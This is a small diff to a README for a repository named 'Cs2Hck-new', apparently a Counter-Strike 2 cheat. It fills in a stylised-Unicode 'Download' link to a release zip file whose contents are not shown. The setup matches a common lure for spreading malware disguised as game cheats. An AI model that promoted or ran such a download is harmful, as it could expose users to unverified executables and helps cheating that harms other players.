@@ -1,6 +1,6 @@
 # Cs2Hck-new
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Wizvenex1/Cs2Hck-new/releases/download/Cs2Hck-new/Cs2Hck-new.zip)
 
 # Install Steps:
 
